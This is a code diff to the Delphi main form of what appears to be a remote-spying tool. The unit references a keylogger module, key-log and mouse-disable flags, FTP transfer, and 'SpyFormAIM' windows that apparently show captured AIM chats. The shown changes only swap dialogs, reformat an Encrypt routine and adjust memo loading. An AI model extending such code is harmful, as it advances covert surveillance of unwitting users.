@@ -6,12 +6,12 @@ uses
   Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
   uOutBar, ExtCtrls, OutlookBtn, StdCtrls, ComCtrls,
   Gauges, Menus, ImgList, MainColors, TFlatComboBoxUnit, RXCtrls,
-  Parole, TFlatCheckBoxUnit, TFlatEditUnit,
+  TFlatCheckBoxUnit, TFlatEditUnit,
   TFlatHintUnit, TFlatSpeedButtonUnit,{ siFltBtn,} {Butonel,}
   ScktComp, TFlatRadioButtonUnit, TFlatMemoUnit, NMMsg,
   RXShell, Animate, FileCtrl, jpeg, DFSStatusBar, RXSlider,
   RXCombos, RXSpin, Ping, TFlatProgressBarUnit, WSocket, TB97Ctls, OleCtrls, ACTIVEVOICEPROJECTLib_TLB,
-  ZLIBArchive, RxGIF, {GIFImage,} kbShellDialogs,inifiles;
+  ZLIBArchive, RxGIF, inifiles;
 
 type
   TMainForm = class(TForm)
@@ -514,7 +514,6 @@ type
     OutlookBtn147: TOutlookBtn;
     OutlookBtn148: TOutlookBtn;
     OutlookBtn149: TOutlookBtn;
-    BrowseFolder: TkbBrowseForFolderDialog;
     Label3: TLabel;
     Label65: TLabel;
     Label112: TLabel;
@@ -532,6 +531,7 @@ type
     Label116: TLabel;
     OutlookBtn2: TOutlookBtn;
     OutlookBtn91: TOutlookBtn;
+    BrowseFolder: TOpenDialog;
     procedure MenuChangeClick(Sender: TObject);
     procedure miDeletePageClick(Sender: TObject);
     procedure PopupMenu1Popup(Sender: TObject);
@@ -944,6 +944,11 @@ var
   IsGetKeys,MouseOFF,getkeylog,ftpactive,Transfering,InTransfer:Boolean;
   StrmSaved:TStream;
   TinePass:String;
+
+
+function Encrypt(ce:string):string;
+function Decrypt(ce:string):string;
+
 implementation
 
 uses AnimUnit, KeyLoggerUnit, showmessageunit, DispInfoUnit,
@@ -1182,7 +1187,9 @@ begin
  Result:=Decrypt(ce);
 end;
 
-function Encrypt(ce:string):string;var x,i:Integer;Text,PW:String;
+function Encrypt(ce:string):string;
+var
+  x,i:Integer;Text,PW:String;
 begin
  if ce='' then begin result:='';exit;end;
  Text:=ce;PW:=IntToStr(MainPass);x:=0; // initialize count
@@ -4598,7 +4605,7 @@ end;
 procedure TMainForm.OutlookBtn93Click(Sender: TObject);
 begin
  if BrowseFolder.Execute then
- Label61.Caption:=BrowseFolder.RootPath;
+ Label61.Caption:=BrowseFolder.filename;
  if Label61.Caption[Length(Label61.Caption)]='\' then
   WriteKey('folder',Label61.Caption) else
   begin Label61.Caption:=Label61.Caption+'\';
@@ -4649,7 +4656,7 @@ begin
    ShowMessage('pick the folder where downloaded files are saved in the next dialog.');
    if BrowseFolder.Execute then
    begin
-    Label61.Caption:=BrowseFolder.RootPath;
+    Label61.Caption:=BrowseFolder.filename;
     if Label61.Caption[Length(Label61.Caption)]='\' then
     WriteKey('folder',Label61.Caption) else
     begin Label61.Caption:=Label61.Caption+'\';
@@ -4834,22 +4841,27 @@ end else begin
 // showmessage(spymemo.lines.text);
  if (not add) then begin
   case SpyFormAIM[care].ToolBarButton971.ImageIndex of
-   0:begin SpyFormAIM[care].T_X_T.LoadStrings(SpyMemo.Lines);
+   0:begin SpyFormAIM[care].T_X_T.Lines.text := SpyMemo.Lines.text;
            SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyMemo.Lines.Text;end;
    1,2:SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyMemo.Lines.Text;
   end;
   end else begin
   case SpyFormAIM[care].ToolBarButton971.ImageIndex of
-   0:begin l:=Pos('</BODY>',SpyFormAIM[care].T_X_T_Old.Lines.Text);if l<>0 then begin
-           t:=Copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l-1);SpyFormAIM[care].T_X_T_Old.Lines.Text:=t;end;
+   0:
+   begin
+     l:=Pos('</BODY>',SpyFormAIM[care].T_X_T_Old.Lines.Text);if l<>0 then
+     begin
+       t:=Copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l-1);SpyFormAIM[care].T_X_T_Old.Lines.Text:=t;
+     end;
            SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyFormAIM[care].T_X_T_Old.Lines.Text+SpyMemo.Lines.Text;
-           SpyFormAIM[care].T_X_T.LoadStrings(SpyFormAIM[care].T_X_T_Old.Lines);end;
+           SpyFormAIM[care].T_X_T.Lines.Text := SpyFormAIM[care].T_X_T_Old.Lines.text;
+     end;
    1,2:begin l:=length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
        SpyFormAIM[care].T_X_T_Old.Lines.Text:=copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l)+SpyMemo.Lines.Text;end;
   end;
   end;
 end;
- try SpyFormAIM[care].T_X_T.VScrollBarPosition:=SpyFormAIM[care].T_X_T.VScrollBarRange;except end;
+ //try SpyFormAIM[care].T_X_T.VScrollBarPosition:=SpyFormAIM[care].T_X_T.VScrollBarRange;except end;
  try SpyFormAIM[care].T_X_T_Old.SelStart:=Length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
  SpyFormAIM[care].T_X_T_Old.sellength:=1;except end;
 end;
@@ -5781,10 +5793,10 @@ end;
 procedure TMainForm.OutlookBtn148Click(Sender: TObject);
 begin
  if not BrowseFolder.Execute then exit;
- if not LoadSkin(BrowseFolder.RootPath) then ShowMsg('error loading skin.')
+ if not LoadSkin(BrowseFolder.Filename) then ShowMsg('error loading skin.')
  else begin
   SetTheColors;SaveColors;
-  WriteKey('skin',BrowseFolder.RootPath);
+  WriteKey('skin',BrowseFolder.Filename);
  end;
 end;
 
